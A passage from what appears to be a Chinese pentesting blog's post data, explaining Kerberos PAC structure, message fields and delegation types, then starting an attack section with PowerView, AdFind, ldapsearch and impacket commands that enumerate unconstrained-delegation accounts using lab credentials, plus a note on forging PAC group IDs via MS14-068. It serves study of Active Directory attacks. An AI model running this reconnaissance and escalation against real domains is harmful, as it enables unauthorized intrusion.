do</code> 的问题</p>\n<p>PAC结构：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116215110555.png\" alt=\"image-20250116215110555\"></p>\n<p>PAC整体的结构上是一个AuthorizationData的结构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AuthorizationData ::&#x3D; SEQUENCE OF SEQUENCE &#123;</span><br><span class=\"line\">      ad-type    [0] Int32,</span><br><span class=\"line\">      ad-data    [1] OCTET STRING</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最外层：ad-type = AD-IF-RELEVANT，ad-data = 又一个AuthorizationData结构</p>\n<p>第二层：ad-type = AD-WIN2K-PAC，ad-data = 一段连续的空间</p>\n<p>连续空间：一个头部 <strong>PACTYPE</strong> 以及 若干个 <strong>PAC_INFO_BUFFER</strong></p>\n<p>其中PAC_INFO_BUFFER为 key-value 类型</p>\n<table>\n<thead>\n<tr>\n<th>0x00000001</th>\n<th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0x00000002</td>\n<td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>\n</tr>\n<tr>\n<td>0x00000006</td>\n<td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x00000007</td>\n<td>KDC校验和。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x0000000A</td>\n<td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x0000000B</td>\n<td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x0000000C</td>\n<td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>\n</tr>\n<tr>\n<td>0x0000000D</td>\n<td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x0000000E</td>\n<td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>\n</tr>\n<tr>\n<td>0x0000000F</td>\n<td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>\n</tr>\n</tbody></table>\n<p>其中 0x00000001（登录信息）结构定义了 DC 提供的用户登录和授权信息，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class=\"line\">   FILETIME LogonTime;</span><br><span class=\"line\">   FILETIME LogoffTime;</span><br><span class=\"line\">   FILETIME KickOffTime;</span><br><span class=\"line\">   FILETIME PasswordLastSet;</span><br><span class=\"line\">   FILETIME PasswordCanChange;</span><br><span class=\"line\">   FILETIME PasswordMustChange;</span><br><span class=\"line\">   RPC_UNICODE_STRING EffectiveName;</span><br><span class=\"line\">   RPC_UNICODE_STRING FullName;</span><br><span class=\"line\">   RPC_UNICODE_STRING LogonScript;</span><br><span class=\"line\">   RPC_UNICODE_STRING ProfilePath;</span><br><span class=\"line\">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class=\"line\">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class=\"line\">   USHORT LogonCount;</span><br><span class=\"line\">   USHORT BadPasswordCount;</span><br><span class=\"line\">   ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class=\"line\">   ULONG PrimaryGroupId; </span><br><span class=\"line\">   ULONG GroupCount;</span><br><span class=\"line\">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class=\"line\">   ULONG UserFlags;</span><br><span class=\"line\">   USER_SESSION_KEY UserSessionKey;</span><br><span class=\"line\">   RPC_UNICODE_STRING LogonServer;</span><br><span class=\"line\">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class=\"line\">   PISID LogonDomainId;</span><br><span class=\"line\">   ULONG Reserved1[2];</span><br><span class=\"line\">   ULONG UserAccountControl;</span><br><span class=\"line\">   ULONG SubAuthStatus;</span><br><span class=\"line\">   FILETIME LastSuccessfulILogon;</span><br><span class=\"line\">   FILETIME LastFailedILogon;</span><br><span class=\"line\">   ULONG FailedILogonCount;</span><br><span class=\"line\">   ULONG Reserved3;</span><br><span class=\"line\">   ULONG SidCount;</span><br><span class=\"line\">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class=\"line\">   PISID ResourceGroupDomainSid;</span><br><span class=\"line\">   ULONG ResourceGroupCount;</span><br><span class=\"line\">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class=\"line\">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>\n\n<p>PACTYPE结构是一系列 <strong>PAC_INFO_BUFFER</strong> 结构的数组，每个结构定义 PAC 缓冲区的类型和字节偏移量。PAC_INFO_BUFFER 数组没有定义的顺序。因此，PAC_INFO_BUFFER 缓冲区的顺序没有意义。但是，一旦生成密钥分发中心 (KDC) 和服务器签名，缓冲区的顺序就不能改变，否则 PAC 内容的签名验证将失败。</p>\n<h1 id=\"协议粗节\"><a href=\"#协议粗节\" class=\"headerlink\" title=\"协议粗节\"></a>协议粗节</h1><p>简单记录每个请求中的某些字段</p>\n<h2 id=\"AS-REQ\"><a href=\"#AS-REQ\" class=\"headerlink\" title=\"AS_REQ\"></a>AS_REQ</h2><p>该包发送用户hash加密的时间戳，用于预身份验证</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116002314429.png\" alt=\"image-20250116002314429\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116004509306.png\" alt=\"image-20250116004509306\"></p>\n<p>pvno：kerberos协议版本</p>\n<p>msg-type：消息类型，此请求包对应为 krb-as-req</p>\n<p><strong>padata：</strong>pre-authentication data 预认证</p>\n<ul>\n<li><p>ENC_TIMESTAMP：就是hash加密时间戳</p>\n</li>\n<li><p>PA_PAC_REQUEST：标志是否包含PAC</p>\n</li>\n</ul>\n<p><strong>req-body：</strong>请求主体</p>\n<ul>\n<li><p>cname：用户名，此处可根据返回包不同枚举用户名</p>\n</li>\n<li><p>realm：域名</p>\n</li>\n<li><p>sname：在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>\n</li>\n<li><p>till：到期时间，rubeus 和 kekeo都是 20370913024805Z，此处为工具特征</p>\n</li>\n<li><p>rtime：绝对到期时间</p>\n</li>\n<li><p>nonce：随机数，kekeo/mimikatz 是12381973，rubeus 是1818848256，此处为工具特征</p>\n</li>\n<li><p>etype：加密类型</p>\n</li>\n<li><p>addresses：客户端相关信息</p>\n</li>\n</ul>\n<h2 id=\"AS-REP\"><a href=\"#AS-REP\" class=\"headerlink\" title=\"AS_REP\"></a>AS_REP</h2><p>该包在通过身份验证后将TGT返回给Client，主要包含两部分</p>\n<p>ticket（TGT）：采用krbtgt账户hash加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">用户名</span><br><span class=\"line\">会话密钥</span><br><span class=\"line\">TGT 的到期时间</span><br><span class=\"line\">具有用户权限的 PAC</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>enc-part（一些加密数据）：采用用户hash加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">会话密钥-session key</span><br><span class=\"line\">TGT 的到期日期</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116223255483.png\" alt=\"image-20250116223255483\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/rep.png\"></p>\n<p>cname：用户名</p>\n<p>crealm：域名</p>\n<p><strong>enc-part：</strong>用户hash加密一些数据</p>\n<ul>\n<li>session key：作为下阶段的认证密钥</li>\n</ul>\n<p><strong>ticket：</strong>KDC使用krbtgt hash加密生成的TGT，其中可能包括PAC</p>\n<h2 id=\"TGS-REQ\"><a href=\"#TGS-REQ\" class=\"headerlink\" title=\"TGS_REQ\"></a>TGS_REQ</h2><p>此时Client将获取的KRB_TGT存储到内存中作为凭证用于请求TGS，发送内容主要为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">session key加密的认证</span><br><span class=\"line\">TGT</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116234638578.png\" alt=\"image-20250116234638578\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116234655450.png\" alt=\"image-20250116234655450\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/TGS-REQ.png\"></p>\n<p><strong>padata：</strong> </p>\n<ul>\n<li>AP_REQ：必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据<ul>\n<li>authenticator：经Logon Session Key加密的Authenticator</li>\n<li>ticket：AS_REP中的TGT结构</li>\n</ul>\n</li>\n</ul>\n<p><strong>req-body：</strong></p>\n<ul>\n<li>sname：要请求的服务SPN</li>\n</ul>\n<h2 id=\"TGS-REP\"><a href=\"#TGS-REP\" class=\"headerlink\" title=\"TGS_REP\"></a>TGS_REP</h2><p>KDC使用 Krbtgt hash解密TGS_REQ消息以验证 TGT，然后返回 ST，发送内容主要为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用logon session key加密的 Service Session Key（服务会话密钥）</span><br><span class=\"line\"></span><br><span class=\"line\">使用服务账户HASH加密的TGS(ST)：</span><br><span class=\"line\">\t- 服务会话密钥</span><br><span class=\"line\">    - 用户名</span><br><span class=\"line\">    - TGS(ST) 的有效期</span><br><span class=\"line\">    - 具有用户权限的 PAC ，由 KDC 签名</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250117000509862.png\" alt=\"image-20250117000509862\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/TGS-REP.png\"></p>\n<p><strong>ticket：</strong>一张ST(Service Ticket)，或者叫做TGS。</p>\n<ul>\n<li>enc-part：使用所请求服务账户的hash加密的TGS</li>\n</ul>\n<p><strong>enc-part：</strong>经过Logon Session Key加密的Service Session Key，用于请求服务时的会话密钥，作为作为下阶段的认证密钥</p>\n<h2 id=\"AP-REQ\"><a href=\"#AP-REQ\" class=\"headerlink\" title=\"AP_REQ\"></a>AP_REQ</h2><p>将ST发送给提供服务的服务器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250117002355773.png\" alt=\"image-20250117002355773\"></p>\n<h2 id=\"AP-REP-可选\"><a href=\"#AP-REP-可选\" class=\"headerlink\" title=\"AP_REP(可选)\"></a>AP_REP(可选)</h2><p>KRB_verify_PAC_REQ：应用程序尝试使用 服务账户HASH来解密消息，并验证来自 KDC 的 PAC来识别用户权限</p>\n<p>PAC_Verified_REP：KDC验证PAC</p>\n<h2 id=\"Allow-Service-Access\"><a href=\"#Allow-Service-Access\" class=\"headerlink\" title=\"Allow Service Access\"></a>Allow Service Access</h2><p>允许用户在特定的时间内访问该服务</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>⭐ <a href=\"https://labs.lares.com/fear-kerberos-pt1/\">Kerberos I - Overview</a></p>\n<p>⭐ <a href=\"https://www.chudamax.com/posts/kerberos-102-overview/\">kerberos-102-overview</a></p>\n<p>⭐ <a href=\"https://medium.com/@robert.broeckelmann/kerberos-and-windows-security-kerberos-v5-protocol-b9c804e06479\">Kerberos and Windows Security: Kerberos v5 Protocol</a></p>\n<p>⭐ <a href=\"https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a\">Kerberos Wireshark Captures: A Windows Login Example</a></p>\n<p>⭐ <a href=\"https://daiker.gitbook.io/windows-protocol/kerberos/1\">Windows内网协议学习Kerberos篇</a></p>\n<p>⭐ <a href=\"https://xz.aliyun.com/t/14717\">Kerberos协议之AS_REQ&amp;AS_REP</a></p>\n<p>⭐ <a href=\"https://loong716.top/posts/Kerberos/\">再谈Kerberos</a></p>\n<p>⭐ <a href=\"https://xz.aliyun.com/t/15367\">详解Kerberos认证流程及常见攻击方式</a></p>\n","categories":["内网渗透"]},{"title":"Kerberos Attacks - 委派的原理与利用","url":"/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250522013405141.png\" alt=\"image-20250522013405141\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"委派\"><a href=\"#委派\" class=\"headerlink\" title=\"委派\"></a>委派</h1><p><strong>什么是委派：</strong></p>\n<p>Kerberos 委派是 Kerberos 身份验证协议中的一项功能，允许服务代表用户行事。例如，Web 服务器可以使用 Kerberos 委派来验证用户身份，然后使用该用户身份验证票证代表该用户身份访问后端数据库。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119223054197.png\" alt=\"image-20250119223054197\"></p>\n<p><strong>委派分为：</strong></p>\n<ul>\n<li>非约束委派（Unconstrained Delegation）：允许被委派的服务账户以委派用户的身份访问任何服务，存在较大的安全风险</li>\n<li>约束委派（Constrained Delegation）：限制了委派的范围，服务账户只能访问特定的服务，减少了安全风险</li>\n<li>基于资源的约束委派（Resource Based Constrained Delegation 也称 <strong>RBCD</strong>）：进一步限制了委派权限，将委派的控制权交给拥有被访问资源的管理员，提高了安全性</li>\n</ul>\n<p><strong>域中能够委派的账号类型：</strong></p>\n<ul>\n<li>主机账号（机器账户）：活动目录中的Computers组内的计算机</li>\n<li>服务账户：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer、MYSQL等；域用户通过注册SPN也能成为服务账号。</li>\n</ul>\n<h1 id=\"委派的配置\"><a href=\"#委派的配置\" class=\"headerlink\" title=\"委派的配置\"></a>委派的配置</h1><h2 id=\"非约束委派\"><a href=\"#非约束委派\" class=\"headerlink\" title=\"非约束委派\"></a>非约束委派</h2><p>选择：<code>信任此计算机来委派任何服务 (仅 Kerberos)(T)</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234030581.png\" alt=\"image-20250119234030581\"></p>\n<p>配置了非约束性委派属性的计算机用户的 <strong>userAccountControl</strong> 属性为：<strong>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</strong>，其对应的数是 0x81000=528384</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234246535.png\" alt=\"image-20250119234246535\"></p>\n<p><strong>msDS- AllowedToDelegateTo</strong> 属性为空</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234637164.png\" alt=\"image-20250119234637164\"></p>\n<h2 id=\"约束委派\"><a href=\"#约束委派\" class=\"headerlink\" title=\"约束委派\"></a>约束委派</h2><p>约束性委派有两种：</p>\n<ul>\n<li>仅使用 Kerberos(K)</li>\n<li>使用任何身份验证协议 (N)</li>\n</ul>\n<p>一、仅用 Kerberos 协议进行身份验证，不支持协议转换。配置了仅使用 Kerberos(K) 约束性委派的 <strong>机器账号 和 服务账号</strong> 的 <strong>userAccountControl</strong> 属性与正常账号一样，其 <strong>msDS- AllowedToDelegateTo</strong> 属性会有允许被委派的服务的 SPN。</p>\n<p>点击添加来添加服务，通过spn查找来查看当前域内的服务，这里就添加一个HOST/Win7.test.com作为实例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235138953.png\" alt=\"image-20250119235138953\"></p>\n<p>随便添加一个服务</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235449695.png\" alt=\"image-20250119235449695\"></p>\n<p><strong>msDS- AllowedToDelegateTo</strong> 属性：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235543550.png\" alt=\"image-20250119235543550\"></p>\n<p>二、使用任何身份验证协议 (N)，支持协议的转换。其 <strong>msDS-AllowedToDelegateTo</strong> 属性会有允许被委派的服务的 SPN。</p>\n<p>配置了使用任何身份验证协议 (N) 约束性委派的 <strong>机器账号</strong> 的 <strong>userAccountControl</strong> 属性为： <code>WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是0x1001000=16781312</p>\n<p>配置了使用任何身份验证协议 (N) 约束性委派的 <strong>服务账号</strong> 的 <strong>userAccountControl</strong> 属性为：<code>NORMAL_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是0x1000200=16777728</p>\n<h2 id=\"基于资源的约束委派\"><a href=\"#基于资源的约束委派\" class=\"headerlink\" title=\"基于资源的约束委派\"></a>基于资源的约束委派</h2><p>通过 <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> 属性进行配置，只能在命令行进行配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#To set attribute:</span><br><span class=\"line\">#设置属性</span><br><span class=\"line\">Set-ADComputer -Identity MSSQL01$ -PrincipalsAllowedToDelegateToAccount WEB$ -Verbose</span><br><span class=\"line\"></span><br><span class=\"line\">#To get</span><br><span class=\"line\">#查询属性</span><br><span class=\"line\">$comp &#x3D; Get-ADComputer -Identity MSSQL01$ -Properties msDS-AllowedToActOnBehalfOfOtherIdentity</span><br><span class=\"line\">$comp.&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;.Access</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"流程-非约束委派\"><a href=\"#流程-非约束委派\" class=\"headerlink\" title=\"流程-非约束委派\"></a>流程-非约束委派</h1><p> Windows Server 2000 首次发布Active Directory时引入，客户端会将其 TGT 的副本委派给某个服务，因此该服务可以使用该 TGT 在网络中代表客户端行事。</p>\n<p>以web服务器（HTTP）+文件服务器（FS）作为该实验场景，基本流程：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250126222546137.png\" alt=\"image-20250126222546137\"></p>\n<p>通信流量为：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250126222706358.png\" alt=\"image-20250126222706358\"></p>\n<ol>\n<li>客户端请求TGT（AS-REQ）</li>\n<li>KDC返回TGT（AS-REP）</li>\n<li>客户端请求HTTP服务器的ST（TGS-REQ）</li>\n<li>KDC返回ST，但是 <strong>ok-as-delegate 标志设置为 TRUE，通知客户端所请求的服务已获得授权委托</strong></li>\n<li>客户端再次发起新的TGS-REQ请求，用于请求获取 <strong>额外的用户TGT</strong>，且要求该TGT开启 <strong>forwardable 和 forwarded</strong>，即 <code>可转发TGT</code></li>\n<li>KDC返回 <code>可转发TGT</code></li>\n<li>客户端向HTTP服务器发起AP-REQ请求，该请求包含ST 和 <code>可转发TGT</code> 票证</li>\n<li>HTTP服务器将 <code>可转发TGT</code> <strong>缓存在内存中</strong>，并使用该TGT向KDC请求FS的ST</li>\n<li>KDC返回FS的ST</li>\n<li>HTTP收到FS的ST后，调用FS服务</li>\n<li>FS将结果返回给HTTP</li>\n<li>HTTP再将结果返回给客户端</li>\n</ol>\n<h1 id=\"流程-约束委派\"><a href=\"#流程-约束委派\" class=\"headerlink\" title=\"流程-约束委派\"></a>流程-约束委派</h1><p>由于非约束委派可以伪造访问任何服务的不安全性，微软在 windows server2003 中引入了约束委派，旨在提供一种可供服务使用的更安全的委派形式，<strong>将委派范围限制为仅明确允许的服务</strong>，在约束委派中，TGS 请求中不需要包含用户的 TGT。<strong>服务本身可以代表用户请求其他服务的服务票证，只要有证据表明它已收到用户的请求即可</strong></p>\n<p>对 Kerberos 协议进行了拓展，引入了 S4U。其中 S4U 支持两个子协议：</p>\n<ul>\n<li>Service for User to Proxy (S4U2proxy) ：允许服务账户以用户的身份请求其他服务的服务票据，并将其传递给目标服务，因此具有更广泛的委派权限。</li>\n<li>Service for User to Self (S4U2self) ：允许服务代表用户获取自身的服务票证，但无法代表用户请求其他服务</li>\n</ul>\n<p><strong>仅使用 Kerberos</strong></p>\n<p>当客户端使用 Kerberos 进行身份验证时，服务可以委托（使用 S4U2Proxy 扩展）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127003103141.png\" alt=\"image-20250127003103141\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127005111249.png\" alt=\"image-20250127005111249\"></p>\n<ol start=\"4\">\n<li><p>Kerberos 认证</p>\n</li>\n<li><p>客户端向 Web 服务器发送 HTTP AP-REQ 消息，请求包括服务票证ST</p>\n</li>\n<li><p>HTTP服务可以使用 S4U2Proxy 请求额外的服务票证。将用户ST票证附加到TGS-REQ结构的 <strong>附加票证 字段中</strong>。</p>\n</li>\n<li><p>KDC 将检查附加票证，验证其是否可转发，并通过检查 <strong>msDS-AllowedToDelegateTo</strong> 属性进一步验证 HTTP服务 是否可以委托给 FS服务。通过TGS-REP将FS的ST返给HTTP服务</p>\n</li>\n<li><p>HTTP收到FS的ST后，调用FS服务</p>\n</li>\n<li><p>FS将结果返回给HTTP</p>\n</li>\n<li><p>HTTP再将结果返回给客户端</p>\n</li>\n</ol>\n<p><strong>使用任何身份验证协议</strong></p>\n<p>无论客户端如何进行身份验证，服务都可以委托（使用 S4U2Self 和 S4U2Proxy 扩展）</p>\n<p>例如通过 NTLM 身份验证，服务就没有附加票证，此时需要另一种方式来获取客户端代表其委派的票证，服务可以调用 S4U2Self 来要求身份验证服务为其自身生成任意用户的 TGS，随后再调用 S4U2Proxy。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127003134415.png\" alt=\"image-20250127003134415\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127005949624.png\" alt=\"image-20250127005949624\"></p>\n<ol>\n<li>客户端向 Web 服务器发送 HTTP 请求。由于应用程序不接受 Kerberos，因此将使用 NTLM 执行身份验证</li>\n<li>由于目前没有客户的TGS，无法去获取FS的TGS，所以先使用S4U2Self来请求客户的TGS，存在特定于 S4U2Self 扩展的结构 <strong>pA-FOR-X509-USER</strong>和 <strong>pA-FOR-USER</strong>，其名称为要模拟的客户端</li>\n<li>KDC 将验证 DEV 是否配置了启用约束委派，返回代表自身的 <code>可转发TGS</code></li>\n<li>发起S4U2Proxy 请求FS服务的ST</li>\n<li>返回FS服务的ST</li>\n<li>调用FS服务</li>\n<li>FS将结果返回给HTTP</li>\n<li>HTTP再将结果返回给客户端</li>\n</ol>\n<h1 id=\"流程-基于资源的约束委派\"><a href=\"#流程-基于资源的约束委派\" class=\"headerlink\" title=\"流程-基于资源的约束委派\"></a>流程-基于资源的约束委派</h1><p>为了配置受约束的委派，必须拥有SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派（RBCD）。</p>\n<p>RBCD允许资源配置受信任的帐户委派给他们：仅允许ServiceA能委派访问我的服务</p>\n<p>RBCD将委派的控制权交给拥有被访问资源的管理员：ServiceB的管理员可以配置RBCD，不需要域管了</p>\n<p>RBCD是通过 <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> 属性类进行配置</p>\n<p>见下图对比，约束委派是 <strong>出去能访问到谁</strong>，RBCD是 <strong>谁能够访问到我</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127012741931.png\" alt=\"image-20250127012741931\"></p>\n<p>其通信流程与约束委派相同</p>\n<h1 id=\"域内委派关系查询工具\"><a href=\"#域内委派关系查询工具\" class=\"headerlink\" title=\"域内委派关系查询工具\"></a>域内委派关系查询工具</h1><p>除了 <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">powerview</a>、ADFind、ldapsearch 外还有几种通用查询工具</p>\n<p>impacket</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-findDelegation -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p>Adinfo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;Adinfo -d test.com --dc 192.168.131.130 -u fff -H 5e956...</span><br><span class=\"line\">.&#x2F;Adinfo -d test.com --dc 192.168.131.130 -u fff -p Qq123456..</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"攻击-非约束委派\"><a href=\"#攻击-非约束委派\" class=\"headerlink\" title=\"攻击-非约束委派\"></a>攻击-非约束委派</h1><p>根据其流程，<strong>假设serverA的机器账户开启了非约束委派</strong>，用户user与KDC进行正常的kerberos认证中，KDC发现serverA开启了非约束委派会在TGS-REP中添加标志位 <strong>ok-as-delegate</strong> ，随后用户user再次发起TGS-REQ用于请求获取可代表用户身份的 <strong>可转发TGT</strong>，KDC返回，然后在AP-REQ中将 <strong>ST和可转发TGT</strong> 二者一起发送给serverA，随后serverA将代表用户身份的 <strong>可转发TGT储存在自己的lsass进程中</strong>，后续就能利用这个TGT去代表用户user去访问任何服务。</p>\n<blockquote>\n<p>只要想办法让目标机器对非约束委派机器发起认证，就能获取TGT代表用户去访问任何服务</p>\n</blockquote>\n<h2 id=\"非约束委派查询\"><a href=\"#非约束委派查询\" class=\"headerlink\" title=\"非约束委派查询\"></a>非约束委派查询</h2><p>在域内探测侦察查询非约束委派的账号有几种方法：</p>\n<p>powerview：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy Bypass -Scope Process -Force</span><br><span class=\"line\">import-module .\\powerview.ps1</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class=\"line\">Get-NetComputer -Unconstrained -Domain zjun.com</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询 非约束性委派的服务账号</span><br><span class=\"line\">Get-NetUser -Unconstrained -Domain zjun.com | select name</span><br></pre></td></tr></table></figure>\n\n<p>ADFind：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询 非约束性委派的服务账号</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250515015212828.png\" alt=\"image-20250515015212828\"></p>\n<p>ldapsearch：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install ldap-utils</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class=\"line\">ldapsearch -LLL -x -H ldap:&#x2F;&#x2F;172.16.86.136:389 -D &quot;test@zjun.com&quot; -w &quot;P@ssw0rd&quot; -b &quot;dc&#x3D;zjun,dc&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询 非约束性委派的服务账号</span><br><span class=\"line\">ldapsearch -LLL -x -H ldap:&#x2F;&#x2F;172.16.86.136:389 -D &quot;test@zjun.com&quot; -w &quot;P@ssw0rd&quot; -b &quot;dc&#x3D;zjun,dc&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击利用\"><a href=\"#攻击利用\" class=\"headerlink\" 